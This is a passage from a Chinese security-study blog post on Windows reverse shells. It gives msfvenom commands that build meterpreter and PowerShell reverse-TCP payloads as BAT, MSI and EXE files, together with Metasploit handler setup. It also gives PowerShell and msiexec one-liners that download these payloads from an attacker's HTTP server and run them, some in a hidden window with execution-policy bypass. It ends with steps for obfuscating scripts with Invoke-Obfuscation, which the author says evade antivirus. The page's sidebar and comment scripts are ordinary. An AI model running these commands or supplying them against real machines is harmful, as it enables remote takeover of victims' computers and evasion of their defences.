+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/windows/powershell_reverse_tcp lhost=139.155.49.43 lport=8888 -o 1.bat</span><br><span class="line"></span><br><span class="line">msf &gt; handler -p cmd/windows/powershell_reverse_tcp -H 172.17.0.2 -P 8888</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer 8000</span><br><span class="line"></span><br><span class="line">powershell -c <span class="string">&quot;IEX((New-Object System.Net.WebClient).DownloadString(&#x27;http://139.155.49.43:8000/1.bat&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352395.png" alt="image-20221115134521965"></p>
+<h2 id="Msiexec"><a href="#Msiexec" class="headerlink" title="Msiexec"></a>Msiexec</h2><h3 id="通过Metasploit启动msiexec攻击"><a href="#通过Metasploit启动msiexec攻击" class="headerlink" title="通过Metasploit启动msiexec攻击"></a>通过Metasploit启动msiexec攻击</h3><p>Windows OS安装有一个Windows安装引擎，MSI包使用<code>msiexe.exe</code>来解释安装。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=9999 -f msi &gt; 1.msi</span><br><span class="line"></span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line"></span><br><span class="line">msf &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 172.17.0.2 -P 9999</span><br><span class="line"></span><br><span class="line">msiexec /q /i http://139.155.49.43:8000/1.msi</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151346510.png" alt="image-20221115134658272"></p>
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352396.png" alt="image-20221115134718049"></p>
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="通过Metasploit生成恶意exe文件发起攻击"><a href="#通过Metasploit生成恶意exe文件发起攻击" class="headerlink" title="通过Metasploit生成恶意exe文件发起攻击"></a>通过Metasploit生成恶意exe文件发起攻击</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.78.117 LPORT=4445 -f exe -o 1.exe</span><br><span class="line"></span><br><span class="line">python –m SimpleHTTPServer 8000</span><br><span class="line"></span><br><span class="line">msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.78.117 -P 4445</span><br><span class="line"></span><br><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.78.117:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);start 1.exe</span><br><span class="line"></span><br><span class="line">powershell -ep bypass -nop -w hidden (new-object system.net.webclient).downloadfile(<span class="string">&#x27;http://192.168.78.117:8000/1.exe&#x27;</span>,<span class="string">&#x27;1.exe&#x27;</span>);start-process 1.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="Powershel代码混淆"><a href="#Powershel代码混淆" class="headerlink" title="Powershel代码混淆"></a>Powershel代码混淆</h2><blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+</blockquote>
+<h3 id="启动Invoke-Obfuscation"><a href="#启动Invoke-Obfuscation" class="headerlink" title="启动Invoke-Obfuscation"></a>启动Invoke-Obfuscation</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Powershell –ep bypass</span><br><span class="line">Import-Module ./Invoke-Obfuscation.psd1</span><br><span class="line">Invoke-Obfuscation</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352397.png" alt="image-20221115134926417"></p>
+<h3 id="设置混淆脚本代码位置"><a href="#设置混淆脚本代码位置" class="headerlink" title="设置混淆脚本代码位置"></a>设置混淆脚本代码位置</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> scriptpath C:\Users\mingy\Desktop\mx\Invoke-Obfuscation\pp.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352398.png" alt="image-20221115134958565"></p>
+<h3 id="选择混淆方式为-TOKEN-ALL-1"><a href="#选择混淆方式为-TOKEN-ALL-1" class="headerlink" title="选择混淆方式为 TOKEN\ALL\1"></a>选择混淆方式为 TOKEN\ALL\1</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151350904.png" alt="image-20221115135038487"></p>
+<h3 id="保存混淆之后的脚本"><a href="#保存混淆之后的脚本" class="headerlink" title="保存混淆之后的脚本"></a>保存混淆之后的脚本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out ppp.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352399.png" alt="image-20221115135103578"></p>
+<h3 id="执行未混淆前脚本，被阻止"><a href="#执行未混淆前脚本，被阻止" class="headerlink" title="执行未混淆前脚本，被阻止"></a>执行未混淆前脚本，被阻止</h3><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211151352400.png" alt="image-20221115135119671"></p>
+<h3 id="执行混淆之后脚本可bypass-av"><a href="#执行混淆之后脚本可bypass-av" class="headerlink" title="执行混淆之后脚本可bypass av"></a>执行混淆之后脚本可bypass av</h3><hr>
+<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote>
+<p>- </p>
+</blockquote>
+<blockquote>
+<p><strong>声明：</strong></p>
+<ol>
+<li><p>若文章存在错误，望诸君不吝指正^</p>
+</li>
+<li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p>
+</li>
+</ol>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gungnir.top/">晚上十一点睡觉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gungnir.top/posts/61475">http://gungnir.top/posts/61475</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gungnir.top" target="_blank">晚上十一点睡觉のBlog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a></div><div class="post_share"><div class="social-share" data-image="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237506.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/20558"><img class="prev-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308752.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">0x09 - Web安全基础-Linux反弹shell</div></div></a></div><div class="next-post pull-right"><a href="/posts/50900"><img class="next-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237542.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">0x10 - 漏洞扫描器</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/20558" title="0x09 - Web安全基础-Linux反弹shell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308752.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">0x09 - Web安全基础-Linux反弹shell</div></div></a></div><div><a href="/posts/34204" title="0x09 - Web安全基础-命令执行GetShell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237543.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">0x09 - Web安全基础-命令执行GetShell</div></div></a></div><div><a href="/posts/5917" title="常见Webshell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308750.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-13</div><div class="title">常见Webshell</div></div></a></div><div><a href="/posts/21297" title="Windows DOS命令\批处理脚本学习"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237555.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-02</div><div class="title">Windows DOS命令\批处理脚本学习</div></div></a></div><div><a href="/posts/1769" title="Windows查看端口占用"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237553.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-10</div><div class="title">Windows查看端口占用</div></div></a></div><div><a href="/posts/59646" title="win10误删环境变量Path的几种恢复方法"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237530.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-09-11</div><div class="title">win10误删环境变量Path的几种恢复方法</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晚上十一点睡觉</div><div class="author-info__description">晚上十一点睡觉的个人博客，个人笔记及日志，最近在学习网络安全和Python</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">109</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">59</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/11pmsleep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/11pmsleep" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:860637048@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=860637048" rel="external nofollow noreferrer" target="_blank" title="qq"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">笔记迁移整理中~~~以前习惯有道云记笔记，整理知识也算沉淀自己的一部分吧·· 加油··stay passionate and never say die!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%84%E7%A7%8Dwindows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">各种windows反弹shell的命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NC"><span class="toc-number">1.1.</span> <span class="toc-text">NC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E6%AD%A3%E5%90%91Shell"><span class="toc-number">1.1.1.</span> <span class="toc-text">NC正向Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E5%8F%8D%E5%90%91Shell"><span class="toc-number">1.1.2.</span> <span class="toc-text">NC反向Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mshta"><span class="toc-number">1.2.</span> <span class="toc-text">Mshta</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Metasploit%E7%9A%84HTA-Web-Server%E6%A8%A1%E5%9D%97%E5%8F%91%E8%B5%B7HTA%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">通过Metasploit的HTA Web Server模块发起HTA攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Msfvenom%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8FHTA%E6%96%87%E4%BB%B6%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">通过Msfvenom生成恶意HTA文件发起攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Cobaltstrike%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8FHTA%E6%96%87%E4%BB%B6%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">通过Cobaltstrike生成恶意HTA文件发起攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rundll32"><span class="toc-number">1.3.</span> <span class="toc-text">Rundll32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Msfvenom%E7%94%9F%E6%88%90%E5%8F%8D%E5%BC%B9shell%E7%9A%84dll%E5%8F%91%E8%B5%B7Rundll32%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.1.</span> <span class="toc-text">通过Msfvenom生成反弹shell的dll发起Rundll32攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">本地加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8smb%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">利用smb服务远程加载</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Metasploit%E7%9A%84SMB-Delivery%E6%A8%A1%E5%9D%97%E5%8F%91%E8%B5%B7Rundll32%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.2.</span> <span class="toc-text">通过Metasploit的SMB Delivery模块发起Rundll32攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Rundll32%E5%8A%A0%E8%BD%BDhta%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用Rundll32加载hta反弹shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Regsvr32"><span class="toc-number">1.4.</span> <span class="toc-text">Regsvr32</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Metasploit%E7%9A%84Web-Delivery%E6%A8%A1%E5%9D%97%E5%90%AF%E5%8A%A8Regsvr32"><span class="toc-number">1.4.1.</span> <span class="toc-text">通过Metasploit的Web Delivery模块启动Regsvr32</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Certutil"><span class="toc-number">1.5.</span> <span class="toc-text">Certutil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell"><span class="toc-number">1.6.</span> <span class="toc-text">Powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E8%A7%A3%E9%87%8A"><span class="toc-number">1.6.1.</span> <span class="toc-text">常用参数解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87PowerShell%E5%8F%91%E5%8A%A8Powercat%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.3.</span> <span class="toc-text">通过PowerShell发动Powercat攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Web-delivery%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.6.4.</span> <span class="toc-text">通过Web delivery反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87PowerShell%E5%90%AF%E5%8A%A8cscript-exe"><span class="toc-number">1.6.5.</span> <span class="toc-text">通过PowerShell启动cscript.exe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87PowerShell%E5%90%AF%E5%8A%A8BAT%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.6.</span> <span class="toc-text">通过PowerShell启动BAT文件攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Msiexec"><span class="toc-number">1.7.</span> <span class="toc-text">Msiexec</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Metasploit%E5%90%AF%E5%8A%A8msiexec%E6%94%BB%E5%87%BB"><span class="toc-number">1.7.1.</span> <span class="toc-text">通过Metasploit启动msiexec攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit"><span class="toc-number">1.8.</span> <span class="toc-text">Metasploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87Metasploit%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fexe%E6%96%87%E4%BB%B6%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="toc-number">1.8.1.</span> <span class="toc-text">通过Metasploit生成恶意exe文件发起攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershel%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86"><span class="toc-number">1.9.</span> <span class="toc-text">Powershel代码混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8Invoke-Obfuscation"><span class="toc-number">1.9.1.</span> <span class="toc-text">启动Invoke-Obfuscation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC%E4%BB%A3%E7%A0%81%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.9.2.</span> <span class="toc-text">设置混淆脚本代码位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E6%B7%B7%E6%B7%86%E6%96%B9%E5%BC%8F%E4%B8%BA-TOKEN-ALL-1"><span class="toc-number">1.9.3.</span> <span class="toc-text">选择混淆方式为 TOKEN\ALL\1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98%E6%B7%B7%E6%B7%86%E4%B9%8B%E5%90%8E%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="toc-number">1.9.4.</span> <span class="toc-text">保存混淆之后的脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%9C%AA%E6%B7%B7%E6%B7%86%E5%89%8D%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%A2%AB%E9%98%BB%E6%AD%A2"><span class="toc-number">1.9.5.</span> <span class="toc-text">执行未混淆前脚本，被阻止</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%B7%B7%E6%B7%86%E4%B9%8B%E5%90%8E%E8%84%9A%E6%9C%AC%E5%8F%AFbypass-av"><span class="toc-number">1.9.6.</span> <span class="toc-text">执行混淆之后脚本可bypass av</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#refer"><span class="toc-number">2.</span> <span class="toc-text">refer</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/40881" title="hexo教程-搜索引擎收录"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308767.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo教程-搜索引擎收录"/></a><div class="content"><a class="title" href="/posts/40881" title="hexo教程-搜索引擎收录">hexo教程-搜索引擎收录</a><time datetime="2022-12-01T19:15:20.697Z" title="更新于 2022-12-02 03:15:20">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/27148" title="hexo教程-搭建个人博客踩坑"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237572.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo教程-搭建个人博客踩坑"/></a><div class="content"><a class="title" href="/posts/27148" title="hexo教程-搭建个人博客踩坑">hexo教程-搭建个人博客踩坑</a><time datetime="2022-12-01T19:13:05.101Z" title="更新于 2022-12-02 03:13:05">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/4710" title="12. 网络编程"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237544.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="12. 网络编程"/></a><div class="content"><a class="title" href="/posts/4710" title="12. 网络编程">12. 网络编程</a><time datetime="2022-12-01T18:46:52.094Z" title="更新于 2022-12-02 02:46:52">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5964" title="11. 异常与文件操作"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237533.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11. 异常与文件操作"/></a><div class="content"><a class="title" href="/posts/5964" title="11. 异常与文件操作">11. 异常与文件操作</a><time datetime="2022-12-01T07:21:16.578Z" title="更新于 2022-12-01 15:21:16">2022-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/22609" title="网站SEO优化"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237555.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="网站SEO优化"/></a><div class="content"><a class="title" href="/posts/22609" title="网站SEO优化">网站SEO优化</a><time datetime="2022-11-30T11:09:16.189Z" title="更新于 2022-11-30 19:09:16">2022-11-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By 晚上十一点睡觉</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to 11pmsleep's blog ~~~ 该网站用来记录学习笔记及生活，欢迎交流技术~~~Blog仅供个人记录笔记学习所用，若有侵权，联系我删除~若有错误，也望诸君不吝指正</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.gungnir.top/',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.gungnir.top/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
